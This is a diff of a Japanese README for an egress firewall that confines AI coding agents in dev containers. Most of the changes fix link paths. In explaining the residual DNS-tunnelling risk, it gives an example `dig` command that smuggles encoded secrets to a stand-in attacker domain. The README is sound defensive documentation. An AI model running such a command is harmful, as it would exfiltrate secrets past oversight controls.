@@ -4,19 +4,19 @@
 
 allowlist に載っていない宛先への外向き通信を遮断し、DNS をコンテナに割り当てられたリゾルバに固定します。プロンプトインジェクションやエージェントの暴走が起きても、秘密やソースコードを書き出せる先を限定することが目的です。
 
-**先に読むと速いもの:** [`docs/archive/egress-guard-spec.md`](../../docs/archive/egress-guard-spec.md) §1 の不変条件（I1〜I7）→ [`docs/archive/egress-guard-design.md`](../../docs/archive/egress-guard-design.md) §1 の脅威モデル → 本 README。この 3 つで「何を守っていて、誰から守っているか」という前提が掴めます。本 README はその前提の上に立った**使い方**です。
+**先に読むと速いもの:** [`docs/archive/egress-guard-spec.md`](../../../docs/archive/egress-guard-spec.md) §1 の不変条件（I1〜I7）→ [`docs/archive/egress-guard-design.md`](../../../docs/archive/egress-guard-design.md) §1 の脅威モデル → 本 README。この 3 つで「何を守っていて、誰から守っているか」という前提が掴めます。本 README はその前提の上に立った**使い方**です。
 
 
 | 文書                                                             | 内容                                                                    | 見るとき                     |
 | -------------------------------------------------------------- | --------------------------------------------------------------------- | ------------------------ |
 | 本 README                                                       | 使い方（セットアップと運用）                                                        | 導入する / 運用でつまずいた          |
-| [`docs/archive/egress-guard-spec.md`](../../docs/archive/egress-guard-spec.md)                               | **何が成り立つか**（不変条件・スクリプト仕様・受け入れ基準）                                      | 挙動の正確な定義が要る              |
-| [`docs/archive/egress-guard-design.md`](../../docs/archive/egress-guard-design.md)                           | **なぜそう作ったか**（脅威モデル・設計判断・受容した残余リスク）                                    | 「なぜこうなっていないのか」と思った       |
+| [`docs/archive/egress-guard-spec.md`](../../../docs/archive/egress-guard-spec.md)                               | **何が成り立つか**（不変条件・スクリプト仕様・受け入れ基準）                                      | 挙動の正確な定義が要る              |
+| [`docs/archive/egress-guard-design.md`](../../../docs/archive/egress-guard-design.md)                           | **なぜそう作ったか**（脅威モデル・設計判断・受容した残余リスク）                                    | 「なぜこうなっていないのか」と思った       |
 | [`docs/agent-brief.md`](./docs/agent-brief.md)                 | エージェント向け詳説（遮断の見え方・切り分け・設定変更の制約）                                       | エージェントに allowlist の変更を頼む |
-| [`docs/archive/egress-guard-measuring-egress.md`](../../docs/archive/egress-guard-measuring-egress.md)       | **宛先の実測手順とバンドルの保守**（IP の特定方法・何を許可しないか・実測記録）                           | 許可先を決める / バンドルを測り直す      |
-| [`docs/archive/egress-guard-known-issues.md`](../../docs/archive/egress-guard-known-issues.md)               | 未解決のもの（未実装・未検証・保留）                                                    | 踏んだ問題が既知かどうか調べる          |
-| [`docs/archive/egress-guard-verification-record.md`](../../docs/archive/egress-guard-verification-record.md) | 受け入れ検証の記録（カバレッジ・見逃した欠陥・手順）                                            | 何がどこまで確かめられているか知りたい      |
-| [`docs/archive/egress-guard-web-search-fetch.md`](../../docs/archive/egress-guard-web-search-fetch.md)       | 参考: Claude Code の WebSearch / WebFetch と egress の関係（本パッケージの仕様ではありません） | Web 取得が通らない              |
+| [`docs/archive/egress-guard-measuring-egress.md`](../../../docs/archive/egress-guard-measuring-egress.md)       | **宛先の実測手順とバンドルの保守**（IP の特定方法・何を許可しないか・実測記録）                           | 許可先を決める / バンドルを測り直す      |
+| [`docs/archive/egress-guard-known-issues.md`](../../../docs/archive/egress-guard-known-issues.md)               | 未解決のもの（未実装・未検証・保留）                                                    | 踏んだ問題が既知かどうか調べる          |
+| [`docs/archive/egress-guard-verification-record.md`](../../../docs/archive/egress-guard-verification-record.md) | 受け入れ検証の記録（カバレッジ・見逃した欠陥・手順）                                            | 何がどこまで確かめられているか知りたい      |
+| [`docs/archive/egress-guard-web-search-fetch.md`](../../../docs/archive/egress-guard-web-search-fetch.md)       | 参考: Claude Code の WebSearch / WebFetch と egress の関係（本パッケージの仕様ではありません） | Web 取得が通らない              |
 
 
 ---
@@ -35,9 +35,9 @@ allowlist に載っていない宛先への外向き通信を遮断し、DNS を
 - **悪性コンテンツの流入防止** — allowlist に GitHub や npm がある時点で任意のコンテンツは入ります
 - **完全な exfil 防止** — 許可済みドメインへの GET クエリ経由など、低帯域の漏洩経路は残ります
 - **DNS トンネリングの遮断** — 単一ネットワークの構成では、許可したリゾルバが再帰問い合わせをするため、L3/L4 では原理的に不可能です（internal ネットワークの構成なら塞がります。[internal ネットワークで DNS の持ち出しも塞ぐ（より推奨）](#internal-ネットワークで-dns-の持ち出しも塞ぐより推奨)）
-- **L7 制御（メソッド別・パス別）** — `layer: "l7"` の proxy も TLS を終端しないため扱いません（[`docs/archive/egress-guard-design.md`](../../docs/archive/egress-guard-design.md) §2.23）
+- **L7 制御（メソッド別・パス別）** — `layer: "l7"` の proxy も TLS を終端しないため扱いません（[`docs/archive/egress-guard-design.md`](../../../docs/archive/egress-guard-design.md) §2.23）
 
-**想定している敵はコンテナ内で動くエージェント自身**です。前提と、各非目標を受容した理由は [`docs/archive/egress-guard-design.md`](../../docs/archive/egress-guard-design.md) §1・§3。
+**想定している敵はコンテナ内で動くエージェント自身**です。前提と、各非目標を受容した理由は [`docs/archive/egress-guard-design.md`](../../../docs/archive/egress-guard-design.md) §1・§3。
 
 ---
 
@@ -50,11 +50,11 @@ allowlist に載っていない宛先への外向き通信を遮断し、DNS を
 3. `ipset swap` で差し替え、本番のフィルタテーブルを `iptables-restore` で一括適用する
 4. 自己検証を実行する
 
-**リビルド中に外部ネットワークを必要とする工程はありません。** 途中で強制終了された場合に何が保たれるかは [`docs/archive/egress-guard-design.md`](../../docs/archive/egress-guard-design.md) §2.2。
+**リビルド中に外部ネットワークを必要とする工程はありません。** 途中で強制終了された場合に何が保たれるかは [`docs/archive/egress-guard-design.md`](../../../docs/archive/egress-guard-design.md) §2.2。
 
 **失敗したら panic テーブル**（loopback のみ許可、他は全 DROP）を適用して exit≠0 します。**`docker exec` は iptables を経由しないため、この状態でもコンテナには入れます。**`firewall.json` の検証エラーも同様です。`iptables` が使えると確認する前の失敗だけは、panic テーブルすら適用できないためルール未適用で終了します。
 
-処理順序の詳細は [`docs/archive/egress-guard-spec.md`](../../docs/archive/egress-guard-spec.md) §4.2、その根拠は [`docs/archive/egress-guard-design.md`](../../docs/archive/egress-guard-design.md) §2.2・§2.8。
+処理順序の詳細は [`docs/archive/egress-guard-spec.md`](../../../docs/archive/egress-guard-spec.md) §4.2、その根拠は [`docs/archive/egress-guard-design.md`](../../../docs/archive/egress-guard-design.md) §2.2・§2.8。
 
 ---
 
@@ -70,7 +70,7 @@ capability は `NET_ADMIN` と `NET_RAW`。**書く場所は構成で変わり�
 
 `nameserver` に IPv4 アドレスが 1 つも無い場合は、固定を緩めるのではなく **exit≠0 で停止します**。
 
-> **単一ネットワークの構成では、これで DNS トンネリングは防げません。** 許可されたリゾルバは再帰問い合わせをするため、`dig <秘密をエンコードした名前>.attacker.example` は通ります。**埋め込みリゾルバでも同じです。** 受容している残余リスクとして扱っています（[`docs/archive/egress-guard-design.md`](../../docs/archive/egress-guard-design.md) §3.1）。internal ネットワークの構成ならこの転送自体が止まります（[internal ネットワークで DNS の持ち出しも塞ぐ（より推奨）](#internal-ネットワークで-dns-の持ち出しも塞ぐより推奨)）。
+> **単一ネットワークの構成では、これで DNS トンネリングは防げません。** 許可されたリゾルバは再帰問い合わせをするため、`dig <秘密をエンコードした名前>.attacker.example` は通ります。**埋め込みリゾルバでも同じです。** 受容している残余リスクとして扱っています（[`docs/archive/egress-guard-design.md`](../../../docs/archive/egress-guard-design.md) §3.1）。internal ネットワークの構成ならこの転送自体が止まります（[internal ネットワークで DNS の持ち出しも塞ぐ（より推奨）](#internal-ネットワークで-dns-の持ち出しも塞ぐより推奨)）。
 
 ---
 
@@ -149,15 +149,15 @@ COPY --from=ghcr.io/himorogy/egress-proxy:1@sha256:<digest> /usr/share/egress-gu
 - **Docker の埋め込みリゾルバ `127.0.0.11` が使えます。** デフォルトブリッジでは、ホスト側の DNS アドレス宛に外向きの穴が 1 つ開きます
 - **1 つのネットワークを全プロジェクトで共有しないでください。** 同居するコンテナが相互に到達できる状態になります
 
-判断の根拠（リゾルバの選択で何が変わるか、ホストの OS で影響が変わること、埋め込みリゾルバのデメリット、共有時に守れない点）は [`docs/archive/egress-guard-design.md`](../../docs/archive/egress-guard-design.md) §4 を参照してください。
+判断の根拠（リゾルバの選択で何が変わるか、ホストの OS で影響が変わること、埋め込みリゾルバのデメリット、共有時に守れない点）は [`docs/archive/egress-guard-design.md`](../../../docs/archive/egress-guard-design.md) §4 を参照してください。
 
 ### internal ネットワークで DNS の持ち出しも塞ぐ（より推奨）
 
 **何のために。** 上の構成でも、dev は Docker の埋め込みリゾルバに外部名を問い合わせられ、リゾルバは再帰的に転送する。`<秘密をエンコードした名前>.attacker.example` のような問い合わせは proxy のログにも firewall の記録にも残らず外へデータを持ち出せる（[DNS トンネリングは防げません](#dns-トンネリングは防げません)）。dev を `internal: true` のネットワークだけに載せ、egress-proxy を internal と外向きの両方に載せると、この転送が止まる。
 
-**どう動くか。** dev は internal 側だけに、egress-proxy は internal と外向きの両方に載せる。**dev を外向きのネットワークにも載せると塞がったことにならない**——1 本でも外向きのネットワークに乗っていると転送が戻る。この性質の機序と根拠は `docs/conventions.md`「発見しにくい事実」を参照。完全な構成は [`images/devcontainer-base/examples/docker-compose.yaml`](../../images/devcontainer-base/examples/docker-compose.yaml) を参照してください。
+**どう動くか。** dev は internal 側だけに、egress-proxy は internal と外向きの両方に載せる。**dev を外向きのネットワークにも載せると塞がったことにならない**——1 本でも外向きのネットワークに乗っていると転送が戻る。この性質の機序と根拠は `docs/conventions.md`「発見しにくい事実」を参照。完全な構成は [`images/devcontainer-base/examples/docker-compose.yaml`](../../devcontainer-base/examples/docker-compose.yaml) を参照してください。
 
-**必要な Docker の版。** Moby 26.0.0-rc3 / 25.0.5 / 23.0.11 以降が要ります。devcontainer-base の雛形を使う場合に要る base の最低版は [`images/devcontainer-base/README.md`](../../images/devcontainer-base/README.md) を参照してください。
+**必要な Docker の版。** Moby 26.0.0-rc3 / 25.0.5 / 23.0.11 以降が要ります。devcontainer-base の雛形を使う場合に要る base の最低版は [`images/devcontainer-base/README.md`](../../devcontainer-base/README.md) を参照してください。
 
 **internal と両立しない機能。** internal には外向きの経路もホストへの経路も無いため、`allowCidrs` と `allowHostPorts` は届きません。実現層 `l3` は dev 側の名前解決で allowlist を作るため、これも internal とは両立しません。これらを使う構成は従来どおり単一ネットワークのままにするしかなく、その場合は DNS の持ち出し経路が残ります。
 
@@ -285,7 +285,7 @@ init-project-firewall.sh --check-config
 
 > **実際のファイルにコメントは書けません。** `jq` でパースするため、上のコメントを残したままだと**不正な JSON として拒否され、コンテナは panic テーブル（loopback 以外すべて遮断）で起動します。** 貼るときは落としてください。
 
-型・必須・拒否条件の正確な定義は [`docs/archive/egress-guard-spec.md`](../../docs/archive/egress-guard-spec.md) §3.1。`allowDomains` にワイルドカードが使えない理由は[こちら](#ワイルドカードドメインは使えません)。
+型・必須・拒否条件の正確な定義は [`docs/archive/egress-guard-spec.md`](../../../docs/archive/egress-guard-spec.md) §3.1。`allowDomains` にワイルドカードが使えない理由は[こちら](#ワイルドカードドメインは使えません)。
 
 ## 実現層（`layer`）
 
@@ -313,7 +313,7 @@ version 2 の設定は `layer` でファイアウォールの実現層を選べ�
 
 **`layer` の既定 `l7` を使うには、`egress-proxy` という名前の sidecar コンテナが要ります。** 立っていないと `init-project-firewall.sh` は最終テーブルを組む段で `egress-proxy` の名前解決に失敗し、非ゼロで終了して panic テーブル（loopback のみ許可）に落ちます。`l3` を明示した設定ではこの sidecar は不要です。
 
-sidecar は配布イメージ [`ghcr.io/himorogy/egress-proxy`](../../images/egress-proxy/README.md) を使います。
+sidecar は配布イメージ [`ghcr.io/himorogy/egress-proxy`](../../egress-proxy/README.md) を使います。
 プロジェクトの compose に `dockerfile_inline` で次の3行を書いてください。
 
 ```yaml
@@ -326,7 +326,7 @@ services:
         RUN egress-proxy-bake /firewall.json
 ```
 
-焼いてあるもの・タグ体系・リリース手順は [`images/egress-proxy/README.md`](../../images/egress-proxy/README.md) を参照してください。
+焼いてあるもの・タグ体系・リリース手順は [`images/egress-proxy/README.md`](../../egress-proxy/README.md) を参照してください。
 完全な compose の書き方は `images/devcontainer-base/examples/docker-compose.yaml` の `egress-proxy` service を参照してください。
 `dev` 側に足すのは次の3つです。
 
@@ -357,13 +357,13 @@ tail -f /var/log/egress-proxy/access.log
 
 ## L7 の実機での確認
 
-このリポジトリ自身の `.devcontainer` 構成が `layer: "l7"`（既定）で動くことは、`packages/egress-guard/tests/verify-l7.sh` で確認できます。Docker と外向きの到達性が要るため `pnpm test` には含まれません。ホストで次を実行してください。
+このリポジトリ自身の `.devcontainer` 構成が `layer: "l7"`（既定）で動くことは、`images/shared/egress-guard/tests/verify-l7.sh` で確認できます。Docker と外向きの到達性が要るため `pnpm test` には含まれません。ホストで次を実行してください。
 
 ```sh
 pnpm verify:l7
 ```
 
-apt-get 経由の疎通、先頭ドットで許可したドメインの具体名への到達、未許可ドメインの拒否、proxy を無視した直接接続の遮断、ACL の変更に再ビルドが要ることなどを確認します。実行結果と環境（ホストの OS・Docker の版・iptables のバックエンド）は [`docs/archive/egress-guard-verification-record.md`](../../docs/archive/egress-guard-verification-record.md) に記録します。
+apt-get 経由の疎通、先頭ドットで許可したドメインの具体名への到達、未許可ドメインの拒否、proxy を無視した直接接続の遮断、ACL の変更に再ビルドが要ることなどを確認します。実行結果と環境（ホストの OS・Docker の版・iptables のバックエンド）は [`docs/archive/egress-guard-verification-record.md`](../../../docs/archive/egress-guard-verification-record.md) に記録します。
 
 ## 基底プロファイル（`profile`）
 
@@ -390,7 +390,7 @@ apt-get 経由の疎通、先頭ドットで許可したドメインの具体名
 
 > **`"profile": "default"` は受理されません。** 以前のバージョンで「全バンドル」を意味していた名前です。バンドルを明示的に列挙してください。
 
-**バンドルの中身は他社製品のエンドポイントなので、測り直しが要ります。** テレメトリ・ログ送信・feature flag は入れていません。**その判断基準・実測結果・測り方は [`docs/archive/egress-guard-measuring-egress.md`](../../docs/archive/egress-guard-measuring-egress.md)、バンドル方式を選んだ理由は [`docs/archive/egress-guard-design.md`](../../docs/archive/egress-guard-design.md) §2.17。**
+**バンドルの中身は他社製品のエンドポイントなので、測り直しが要ります。** テレメトリ・ログ送信・feature flag は入れていません。**その判断基準・実測結果・測り方は [`docs/archive/egress-guard-measuring-egress.md`](../../../docs/archive/egress-guard-measuring-egress.md)、バンドル方式を選んだ理由は [`docs/archive/egress-guard-design.md`](../../../docs/archive/egress-guard-design.md) §2.17。**
 
 ## 何が許可されているか見る
 
@@ -404,9 +404,9 @@ init-project-firewall.sh --print-allowlist
 
 ## 拒否される値
 
-効力を持つ `firewall.json` は root 所有ですが、その内容は repo から来る以上、**攻撃者が書いたデータとして扱います。** ワイルドカードを含むドメイン、シェルのメタ文字や空白を含む文字列、`0.0.0.0/0` とプレフィックス長 8 未満の CIDR、私設アドレス帯（RFC1918・**CGNAT の `100.64.0.0/10**`・loopback・link-local・multicast / 予約）を含む CIDR、範囲外のポート番号が拒否されます。**判定は前方一致ではなく数値レンジの重複なので、`100.0.0.0/8` のような包含するスーパーネットも通りません。** 完全な一覧は [`docs/archive/egress-guard-spec.md`](../../docs/archive/egress-guard-spec.md) §3.2。
+効力を持つ `firewall.json` は root 所有ですが、その内容は repo から来る以上、**攻撃者が書いたデータとして扱います。** ワイルドカードを含むドメイン、シェルのメタ文字や空白を含む文字列、`0.0.0.0/0` とプレフィックス長 8 未満の CIDR、私設アドレス帯（RFC1918・**CGNAT の `100.64.0.0/10**`・loopback・link-local・multicast / 予約）を含む CIDR、範囲外のポート番号が拒否されます。**判定は前方一致ではなく数値レンジの重複なので、`100.0.0.0/8` のような包含するスーパーネットも通りません。** 完全な一覧は [`docs/archive/egress-guard-spec.md`](../../../docs/archive/egress-guard-spec.md) §3.2。
 
-**同じ検査は DNS 応答にも掛かります。** 許可したドメインが `169.254.169.254` を返しても allowlist には入りません（[`docs/archive/egress-guard-design.md`](../../docs/archive/egress-guard-design.md) §2.9）。
+**同じ検査は DNS 応答にも掛かります。** 許可したドメインが `169.254.169.254` を返しても allowlist には入りません（[`docs/archive/egress-guard-design.md`](../../../docs/archive/egress-guard-design.md) §2.9）。
 
 `firewall.json` は **PR レビュー必須ファイル**として扱ってください。
 
@@ -414,7 +414,7 @@ init-project-firewall.sh --print-allowlist
 
 ホスト網は**既定で不許可**です。必要なポート（ローカル DB など）だけを `allowHostPorts` で開けてください。対象になるアドレスはデフォルトゲートウェイ（`ip route show default`）と `host.docker.internal` の解決結果（私設アドレスであることを検証）の 2 つだけです。
 
-**Docker Desktop ではこの 2 つが別のアドレスになります。** 実測ではゲートウェイ経由でホストに届かず、`host.docker.internal` 側でのみ到達しました（[`docs/archive/egress-guard-design.md`](../../docs/archive/egress-guard-design.md) §2.15）。
+**Docker Desktop ではこの 2 つが別のアドレスになります。** 実測ではゲートウェイ経由でホストに届かず、`host.docker.internal` 側でのみ到達しました（[`docs/archive/egress-guard-design.md`](../../../docs/archive/egress-guard-design.md) §2.15）。
 
 どちらも取得できない状態で `allowHostPorts` が指定されている場合は、要求された許可を黙って落とすのではなく exit≠0 で停止します。
 
@@ -430,7 +430,7 @@ init-project-firewall.sh --print-allowlist
 { "version": 1, "sshdPort": 22 }
 ```
 
-書いたポートは bootstrap テーブル・最終テーブル・panic テーブルのすべてで開きます。**指定は上記の穴を受け入れる宣言です。** 同居するコンテナからも叩ける口になる点は [`docs/archive/egress-guard-design.md`](../../docs/archive/egress-guard-design.md) §4.4 を参照してください。
+書いたポートは bootstrap テーブル・最終テーブル・panic テーブルのすべてで開きます。**指定は上記の穴を受け入れる宣言です。** 同居するコンテナからも叩ける口になる点は [`docs/archive/egress-guard-design.md`](../../../docs/archive/egress-guard-design.md) §4.4 を参照してください。
 
 **`docker exec` で入る運用（`sshd -i` を含む）では書く必要はありません。** その経路は iptables を通らないため、`sshdPort` を書かなくても影響を受けません。
 
@@ -448,15 +448,15 @@ allowlist 外の外向き通信を REJECT します。`l3` では、遮断され
 
 ## audit
 
-新規プロジェクトの立ち上げ用です。allowlist 外の外向き通信を**遮断せず**、遮断されるはずだった宛先を記録します。`l3` では ipset `egress-audit-v4` へ、`l7` では `egress-proxy` のログへ、名前で記録されます（`l3` の IPv4 側は `fw-audit:` プレフィックスの `LOG` ルールも入りますが、**多くの環境では出力されません**。運用の前提にしないでください。理由は [`docs/archive/egress-guard-measuring-egress.md`](../../docs/archive/egress-guard-measuring-egress.md)）。
+新規プロジェクトの立ち上げ用です。allowlist 外の外向き通信を**遮断せず**、遮断されるはずだった宛先を記録します。`l3` では ipset `egress-audit-v4` へ、`l7` では `egress-proxy` のログへ、名前で記録されます（`l3` の IPv4 側は `fw-audit:` プレフィックスの `LOG` ルールも入りますが、**多くの環境では出力されません**。運用の前提にしないでください。理由は [`docs/archive/egress-guard-measuring-egress.md`](../../../docs/archive/egress-guard-measuring-egress.md)）。
 
 ```json
 { "version": 1, "mode": "audit" }
 ```
 
-数日運用して記録から必要な宛先を収集し、`firewall.json` に転記してから `enforce` に切り替える、という流れを想定しています。静的 allowlist の「事前に全部知らないと使えない」問題への緩和策です。**記録は `enforce` でも行われますが、収集は `audit` で行ってください**（理由は [`docs/archive/egress-guard-measuring-egress.md`](../../docs/archive/egress-guard-measuring-egress.md)）。
+数日運用して記録から必要な宛先を収集し、`firewall.json` に転記してから `enforce` に切り替える、という流れを想定しています。静的 allowlist の「事前に全部知らないと使えない」問題への緩和策です。**記録は `enforce` でも行われますが、収集は `audit` で行ってください**（理由は [`docs/archive/egress-guard-measuring-egress.md`](../../../docs/archive/egress-guard-measuring-egress.md)）。
 
-**audit でも遮断されるものが 3 つあります** — DNS 固定・IPv6・INPUT です。緩むのは IPv4 の外向き通信だけで、一覧と各項目の理由は [`docs/archive/egress-guard-spec.md`](../../docs/archive/egress-guard-spec.md) §6.2。`l7` では、この3つに加えて、proxy を経由しない直接接続も audit のままブロックされます — 緩むのは「proxy が allowlist に無い宛先を通す」ことだけです。
+**audit でも遮断されるものが 3 つあります** — DNS 固定・IPv6・INPUT です。緩むのは IPv4 の外向き通信だけで、一覧と各項目の理由は [`docs/archive/egress-guard-spec.md`](../../../docs/archive/egress-guard-spec.md) §6.2。`l7` では、この3つに加えて、proxy を経由しない直接接続も audit のままブロックされます — 緩むのは「proxy が allowlist に無い宛先を通す」ことだけです。
 
 IPv6 の試行はログ（`fw-drop6:`）に残ります。**silent DROP ではなく `icmp6-adm-prohibited` で即断します**（AAAA を持つ許可先への接続が、IPv4 へフォールバックするまで待たされないため）。
 
@@ -468,7 +468,7 @@ allowlist を通らなかった宛先 IP は ipset `egress-audit-v4` に溜ま�
 docker exec -u root <container> ipset list egress-audit-v4
 ```
 
-**読み方・IP から名前を戻す手順・何を allowlist に足して何を足さないかは [`docs/archive/egress-guard-measuring-egress.md`](../../docs/archive/egress-guard-measuring-egress.md) に集約してあります。** `timeout` の残量から新旧を判断する方法、CDN 上では名前を特定しきれないこと、その場合の決着のつけ方まで、まとめてそちらにあります。
+**読み方・IP から名前を戻す手順・何を allowlist に足して何を足さないかは [`docs/archive/egress-guard-measuring-egress.md`](../../../docs/archive/egress-guard-measuring-egress.md) に集約してあります。** `timeout` の残量から新旧を判断する方法、CDN 上では名前を特定しきれないこと、その場合の決着のつけ方まで、まとめてそちらにあります。
 
 `layer: "l7"`（既定）では、この ipset は作られません。宛先は[proxy のログを読む](#proxy-のログを読む)を参照してください。
 
@@ -501,7 +501,7 @@ This container runs behind an allowlist-based egress firewall (`@himorogy/egress
 - What is allowed: `init-project-firewall.sh --print-allowlist`
 - An allowed host that starts failing means stale addresses (resolved at startup; CDNs move). Re-apply once: `sudo init-project-firewall.sh` — it only re-resolves, so do not retry it.
 - Editing `.devcontainer/firewall.json` does nothing until the image is rebuilt. Never report a blocked host as fixed because you edited it.
-- Anything else: stop and ask a human. Before changing the allowlist, read `packages/egress-guard/docs/agent-brief.md` in the karakuri repository.
+- Anything else: stop and ask a human. Before changing the allowlist, read `images/shared/egress-guard/docs/agent-brief.md` in the karakuri repository.
 ```
 
 **5 行のうち 1 行を再適用に使っているのは、これがエージェントに自力で直せる唯一の失敗だからです。** allowlist は起動時に解決した IP の集合なので、長い作業の途中で CDN のアドレスが動くと、許可してあるはずのホストに落ちます。**「once」と「do not retry」は意図的です。** 効かないなら人間の操作が要る状況であり、繰り返させても意味がありません。
@@ -552,13 +552,13 @@ panic テーブルが適用され、loopback 以外の通信はできない状�
 4. 必要なものを `allowDomains` / `allowCidrs` に足し、`enforce` に戻して再ビルドする
 5. 同じ操作が通ることを確かめる
 
-**3 と 4 の具体的な手順（`layer: "l3"` の場合）は [`docs/archive/egress-guard-measuring-egress.md`](../../docs/archive/egress-guard-measuring-egress.md) にあります。** IP から名前を戻す順序、CDN では名前を特定しきれないこと、記録を汚染しない読み方、何を足して何を足さないか。**そのまま踏むと嵌まる箇所がいくつもあるので、先に読んでください。**
+**3 と 4 の具体的な手順（`layer: "l3"` の場合）は [`docs/archive/egress-guard-measuring-egress.md`](../../../docs/archive/egress-guard-measuring-egress.md) にあります。** IP から名前を戻す順序、CDN では名前を特定しきれないこと、記録を汚染しない読み方、何を足して何を足さないか。**そのまま踏むと嵌まる箇所がいくつもあるので、先に読んでください。**
 
 ---
 
 # 既知の課題・制限
 
-**仕様として決まっている制限**は [`docs/archive/egress-guard-spec.md`](../../docs/archive/egress-guard-spec.md) §9、その根拠は [`docs/archive/egress-guard-design.md`](../../docs/archive/egress-guard-design.md)。**まだ解決していないもの**は [`docs/archive/egress-guard-known-issues.md`](../../docs/archive/egress-guard-known-issues.md) にあります。
+**仕様として決まっている制限**は [`docs/archive/egress-guard-spec.md`](../../../docs/archive/egress-guard-spec.md) §9、その根拠は [`docs/archive/egress-guard-design.md`](../../../docs/archive/egress-guard-design.md)。**まだ解決していないもの**は [`docs/archive/egress-guard-known-issues.md`](../../../docs/archive/egress-guard-known-issues.md) にあります。
 
 運用でつまずきやすいものを以下に挙げます。
 
@@ -613,7 +613,7 @@ allowlist は**起動時に解決した IP の集合**です。**その起動の
 
 **`allowCidrs` での代用は多くの場合採れません。** Fastly の公開レンジは 19 件・**304,128 アドレス**あり、Fastly 上の全サイトへの経路を開くことになります。
 
-仕様上の位置づけは [`docs/archive/egress-guard-spec.md`](../../docs/archive/egress-guard-spec.md) §9.7。**構造的な解決は同 §10.1（L7 proxy 移行）です。** 名前で判定する層に移せば、アドレスがどれだけ動いても関係がなくなります。
+仕様上の位置づけは [`docs/archive/egress-guard-spec.md`](../../../docs/archive/egress-guard-spec.md) §9.7。**構造的な解決は同 §10.1（L7 proxy 移行）です。** 名前で判定する層に移せば、アドレスがどれだけ動いても関係がなくなります。
 
 ## 起動後に外部から取得する作業は成立しません
 
@@ -621,7 +621,7 @@ egress-guard は **`postStartCommand` で適用され、その時点でポリシ
 
 **取得はイメージビルド時に移してください。** これが唯一の推奨です。
 
-`mode` を一時的に `audit` にして窓を開ける運用も、成立はします（[`docs/archive/egress-guard-design.md`](../../docs/archive/egress-guard-design.md) §3.5）。**ただし窓の間コンテナは外へ出られ、閉じ忘れれば以後の `docker start` でも `audit` で立ち上がります。手順はここには書きません。**
+`mode` を一時的に `audit` にして窓を開ける運用も、成立はします（[`docs/archive/egress-guard-design.md`](../../../docs/archive/egress-guard-design.md) §3.5）。**ただし窓の間コンテナは外へ出られ、閉じ忘れれば以後の `docker start` でも `audit` で立ち上がります。手順はここには書きません。**
 
 ## 許可済みドメインへの GET 経由の漏洩は防げません
 
@@ -629,7 +629,7 @@ L3/L4 では HTTP メソッドもパスも見えないため、`allowDomains` �
 
 ## DNS トンネリングは防げません
 
-単一ネットワークの構成では、[できないこと（設計上の非目標）](#できないこと設計上の非目標)と [DNS リゾルバ](#dns-リゾルバ)の注意書きのとおりです。機序と受容の理由は [`docs/archive/egress-guard-design.md`](../../docs/archive/egress-guard-design.md) §3.1。internal ネットワークの構成を使う場合は [internal ネットワークで DNS の持ち出しも塞ぐ（より推奨）](#internal-ネットワークで-dns-の持ち出しも塞ぐより推奨)を参照してください。
+単一ネットワークの構成では、[できないこと（設計上の非目標）](#できないこと設計上の非目標)と [DNS リゾルバ](#dns-リゾルバ)の注意書きのとおりです。機序と受容の理由は [`docs/archive/egress-guard-design.md`](../../../docs/archive/egress-guard-design.md) §3.1。internal ネットワークの構成を使う場合は [internal ネットワークで DNS の持ち出しも塞ぐ（より推奨）](#internal-ネットワークで-dns-の持ち出しも塞ぐより推奨)を参照してください。
 
 ## Web 検索は使えます。Web 取得は許可したドメインだけです
 
@@ -637,29 +637,29 @@ Claude Code の **WebSearch は追加設定なしで使えます**（Anthropic �
 
 **WebFetch はコンテナ内から取得先へ直接接続します。** したがって `allowDomains` に無いドメインは取得できません。よく参照するドキュメントサイトは `firewall.json` に列挙してください。
 
-取得内容はふつう小型モデルの要約を経由するため、prompt injection の緩衝材になります。**ただし Claude Code が事前承認している 91 のドキュメントドメインでは、この緩衝材が働きません**（何が起きるか、`allowDomains` に入れるときに何を勘定に入れるべきかは [`docs/archive/egress-guard-web-search-fetch.md`](../../docs/archive/egress-guard-web-search-fetch.md) §2）。
+取得内容はふつう小型モデルの要約を経由するため、prompt injection の緩衝材になります。**ただし Claude Code が事前承認している 91 のドキュメントドメインでは、この緩衝材が働きません**（何が起きるか、`allowDomains` に入れるときに何を勘定に入れるべきかは [`docs/archive/egress-guard-web-search-fetch.md`](../../../docs/archive/egress-guard-web-search-fetch.md) §2）。
 
-実測の結果と、バージョンが上がったときの再確認手順は [`docs/archive/egress-guard-web-search-fetch.md`](../../docs/archive/egress-guard-web-search-fetch.md)。
+実測の結果と、バージョンが上がったときの再確認手順は [`docs/archive/egress-guard-web-search-fetch.md`](../../../docs/archive/egress-guard-web-search-fetch.md)。
 
 ## 未検証の環境
 
-実機検証（[`docs/archive/egress-guard-verification-record.md`](../../docs/archive/egress-guard-verification-record.md)）は **Docker Desktop（macOS / arm64）** で、デフォルトブリッジとユーザー定義ネットワークの両方について完了しています。次は環境を用意できておらず未検証です。
+実機検証（[`docs/archive/egress-guard-verification-record.md`](../../../docs/archive/egress-guard-verification-record.md)）は **Docker Desktop（macOS / arm64）** で、デフォルトブリッジとユーザー定義ネットワークの両方について完了しています。次は環境を用意できておらず未検証です。
 
 - **IPv6 が有効なコンテナ** — 検証環境には `lo` の `::1` しか IPv6 アドレスがありません
 - **Linux ホスト上の Docker** — 検証はすべて linuxkit VM 上です。デフォルトブリッジのリゾルバが実在の LAN 機器になる点、`systemd-resolved` 環境での挙動が未確認
 - **CI ランナー / クラウド開発環境 / rootless Docker**
 
-詳細と、それぞれ何が問題になり得るかは [`docs/archive/egress-guard-known-issues.md`](../../docs/archive/egress-guard-known-issues.md) を参照してください。
+詳細と、それぞれ何が問題になり得るかは [`docs/archive/egress-guard-known-issues.md`](../../../docs/archive/egress-guard-known-issues.md) を参照してください。
 
 ---
 
 # 開発
 
-このパッケージを直す場合は、このリポジトリのルートで、CI が回すのと同じ 3 つを実行します。
+egress-guard のスクリプトを直す場合は、このリポジトリのルートで、CI が回すのと同じ 3 つを実行します。
 
 ```sh
 pnpm lint          # biome
-pnpm lint:sh       # shellcheck（ワークスペース全体へ再帰）
+pnpm lint:sh       # shellcheck（ルートの `lint:sh:images` が `scripts/` と `tests/` を検査）
 pnpm test          # 設定 230 件 + ルール 280 件
 ```
 
@@ -668,8 +668,8 @@ pnpm test          # 設定 230 件 + ルール 280 件
 
 **`pnpm test` はこの 2 本を順に実行し、集計はスイートごとに別々に出ます。** 合算した数字は表示されません。
 
